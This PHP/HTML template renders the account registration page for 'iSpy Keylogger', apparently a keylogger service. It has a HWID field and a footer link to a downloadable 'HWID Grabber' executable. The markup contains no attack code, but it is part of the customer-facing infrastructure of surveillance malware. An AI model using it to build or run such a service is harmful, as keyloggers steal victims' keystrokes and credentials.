<!DOCTYPE html>
<html lang="en" class="body-full-height">
<head>        
        <!-- META SECTION -->
        <title>iSpy Keylogger :: Register</title>            
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        
        <link rel="icon" href="favicon.ico" type="image/x-icon" />
        <!-- END META SECTION -->
        
        <!-- CSS INCLUDE -->        
        <link rel="stylesheet" type="text/css" id="theme" href="css/theme-default.css"/>             
        <!-- EOF CSS INCLUDE -->                                     
    </head>
    <body>
        
        <div class="login-container">
        
            <div class="login-box animated fadeInDown">
                <div class="login-logo"></div>
                <div class="login-body">
                    <center><div class="login-title"><strong>Create an account</strong></div></center>
                    <?php if (validation_errors()) { ?>
                    <div class="alert alert-danger" role="alert">
                        <?php echo validation_errors(); ?>
                    </div>
                    <?php } echo form_open('do_register', 'class="form-horizontal"'); ?>
                    <div class="form-group">
                        <div class="col-md-12">
                            <input type="text" class="form-control" name="username" id="username" placeholder="Username" value="<?php echo $this->security->xss_clean($this->input->post('username')); ?>"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-md-12">
                            <input type="text" class="form-control" name="email" id="email" placeholder="Email Address" value="<?php echo $this->security->xss_clean($this->input->post('email')); ?>"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-md-12">
                            <input type="text" class="form-control" name="hwid" id="hwid" placeholder="HWID" value="<?php echo $this->security->xss_clean($this->input->post('hwid')); ?>"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-md-12">
                            <input type="password" class="form-control" name="password" id="password" placeholder="Password"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-md-12">
                            <input type="password" class="form-control" name="cpassword" id="cpassword" placeholder="Confirm Password"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-md-12">
                            <input type="text" style="width: 240px; display: inline-block; border-top-left-radius: 4px; border-top-right-radius: 0px; border-bottom-left-radius: 4px; border-bottom-right-radius: 0px;" class="form-control" name="captcha" id="captcha" placeholder="Captcha"/><?php echo $image; ?>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-md-6">
                            <a href="login" class="btn btn-link btn-block">Already Registered?</a>
                        </div>
                        <div class="col-md-6">
                            <button class="btn btn-info btn-block">Create Account</button>
                        </div>
                    </div>
                    </form>
                </div>
                <div class="login-footer">
                    <center>By registering, you're agreeing to the <a target="_blank" href="tos.html">Terms Of Service.</a></center>
                </div>
                <div class="login-footer">
                    <div class="pull-left">
                        &copy; 2014 iSpy Keylogger
                    </div>
                    <div class="pull-right">
                        <a href="https://rsdox.com/ispy/downloads/iSpy HWID Grabber.exe">HWID Grabber</a> |
                        <a href="#">Terms Of Service</a>
                    </div>
                </div>
            </div>
            
        </div>
        
    </body>
</html>